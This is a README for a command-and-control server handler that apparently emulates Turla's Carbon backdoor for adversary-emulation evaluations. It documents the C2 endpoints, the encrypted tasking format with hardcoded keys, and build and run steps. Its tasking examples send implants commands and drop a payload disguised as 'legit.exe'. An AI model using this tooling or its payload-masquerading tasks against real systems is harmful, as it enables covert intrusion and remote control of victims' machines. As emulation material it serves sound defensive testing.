# Carbon HTTP handler

The Carbon HTTP C2 handler is the server-side counterpart for the Carbon implant and is specifically designed to interact with it over HTTP.
The handler is configured to do the following:
- respond to basic heartbeat requests at `/` to indicate server availability.
- register a new implant at `/javascript/*` where * indicates any page when a `PHPSESSID` cookie is included.<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>
- indicate that a session exists for an existing implant at `/javascript/*` where * indicates any page when a `PHPSESSID` cookie is included.
- return command instructions at `/javascript/view.php` when a `PHPSESSID` cookie is included.<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>
- process posted data at `/javascript/` for requests with a valid `PHPSESSID` cookie.
- accept tasking from `./evalsC2client.py` and send to implants when requested.

## Components
The handler consists of an HTTP web server that listens on a specified address/port and serves the following URL endpoints:
- `GET /`, where the server is expecting heartbeat requests and will respond with `200 OK` if it is up.
- `GET /javascript/*`, where * indicates any page, where the server is listening for requests with a `PHPSESSID` cookie. The server will register new implant sessions using that `PHPSESSID` cookie value as the UUID or state that the session already exists.<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>
- `GET /javascript/view.php`, where the server is listening for requests with a `PHPSESSID` cookie. The server will return an HTML document with a task embedded, currently encoded in base64.<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>
- `POST /javascript/` or `POST /javascript/*`, where the server is listening for requests with a `PHPSESSID` cookie and data. The server will attempt to process data sent with the `POST` request. The correct format for this data is as follows:

| Field | Data Type | Description |
| ------------ | ----------- | ----------- |
| id | 4 byte int | the task ID |
| val | 4 byte int | number of files to send |
| tmp_filesize | 4 byte int | the length of the file being uploaded |
| tmp_content | bytes | the data of the file being uploaded |
| len_object_id | 4 byte int | the length of the implant's ID |
| object_id | bytes | the implant's ID |

## Encryption
When tasking the implant, the Carbon C2 handler will encrypt the task information before embedding the base64 blob in the response HTML. The tasking information is first encrypted using CAST128 and a randomly generated symmetric key. This key is then base64-encoded and encrypted using an RSA public key. The CAST128 ciphertext (with the IV prepended) is appended to the RSA ciphertext, and the result is base64-encoded and placed in the response HTML.<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/),[2](https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra),[3](https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html)</sup>

The following RSA public key is used (DER base64-encoded):
```
MIIBCAKCAQEAxcvv98NsuX1Fuff9LDyV5fpp/MAbPvIYiMyoups9uhJz7v0E4MRCZQoM6w49rjmMTgsps3TJe8IR/6waEOTzevVBmma2LFd6Q+wlOnfdHFLa2YjCUyY1fvBP+7poc9U/hjf4mLs9hGih8wBUEPZtNYerA/aZM2bwpH7JjTXdQmCZ0Y7WalNn3me+Y9mEXQS16+uxXX3uEjB0zg9J+18H5dDRe40O91pLToAGKw/+s3bs9wuvLw0sArUQusC0T/msUOAawPgUDDv008w1PJblHRnDq6u1R1WD73VjDo1cGd/OfZH166JkVLiOXsrcgYL820cr1BuQuBoMthER5QUs7wIBEQ==
```

The 2048-bit RSA public/private key pair used for this implant was generated using Crypto++'s `GenerateRandomWithKeySize` method and then converted to DER format.
To convert from DER to PEM format, you can use the following `openssl` commands:
```
openssl rsa -RSAPublicKey_in -in rsa-public.key -inform DER -outform PEM -out public.pem -pubout
openssl rsa -in rsa-private.key -inform DER -outform PEM -out private.pem

# Used in c2 handler testing
openssl pkey -in private.pem -traditional -out privatepkcs1.pem 
```

When handling task output from the implant, the C2 handler will decrypt responses using the following hardcoded CAST-128 key:
```
f2d4560891bd948692c28d2a9391e7d9
```

Carbon DLL has used a similar encryption setup for C2 communication in the past<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>, with additional components such as an intermediary signature block.

## Usage

### Building
You can build the control server binary with the following command:
```
go build -o controlServer main.go
```

### Configuration
To enable and configure the Carbon HTTP handler within the control server, edit the `config/handler_config.yml` from the main C2 server repo. Adjust the Carbon HTTP entry as needed.

Example:
```
carbonhttp:
    host: 10.0.2.4
    port: 80
    enabled: true
```

Run the `controlServer` binary as `sudo` and look for success messages in starting up the Carbon handler.
```
sudo ./controlServer
```

### Testing
Unit tests are available for this handler in the `carbon_http_test.go` file. If you would like to run these tests, use the command `sudo go test ./...` in the `evalsC2server` directory, and the unit tests for the Carbon handler will be performed.

If you wish to test this handler manually, these are some sample `curl` commands that might be useful:
- check that the server heartbeat functionality works:
```
curl http://10.0.2.4:80
```
- check that the server creates a session for a new implant, responds to an existing session, and returns basic tasking output
```
curl -b 'PHPSESSID=ValidUUID' http://10.0.2.4:80/javascript/view.php
```
- check that the server is responding with the correct HTTP status in the case of an error
```
curl -v http://10.0.2.4:80/javascript/somepage.php
```
- check that the server is able to process `POST` data correctly **(out of date)**
```
curl -X POST -b "PHPSESSID=ValidUUID" http://10.0.2.4:80/javascript/ -d '101 | 2 | 100 | result data | 200 | result data 2 | 16 | ValidUUID'
```

### Tasking
To submit a task for the to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields<sup>[1](https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/)</sup>:

| Field | Data Type | Description |
| ------------ | ----------- | ----------- |
| id | int | required, task ID |
| routing | string | optional, P2P routing blob |
| code | int | optional, task type code. Defaults to `0` if not provided. Can be from 1-99 |
| payload | string | optional, name of the server-side payload to deliver as part of the task. The file must reside in the `Resources/payloads/carbon` directory in the parent repository |
| payload_dest | string | optional, path to save the payload on the victim machine. Must be provided if passing in `payload` |
| cmd | string | required, the command to execute |

The C2 handler will take care of building the appropriate config file using the provided payload and app information.

Examples (`GUID` represents the ID of the implant to task:
```
# Task without a payload
./evalsC2client.py --set-task [UUID] '{"id": 1, "code": 0, "cmd": "whoami /all"}'

# Task with a payload
./evalsC2client.py --set-task [UUID] '{"id": 2, "code": 0, "payload": "sniffer.exe", "payload_dest": "C:\\Users\\Public\\legit.exe", "cmd": "C:\\Users\\Public\\legit.exe arg1 arg2"}'
```

### CTI References
1. https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
2. https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra
3. https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
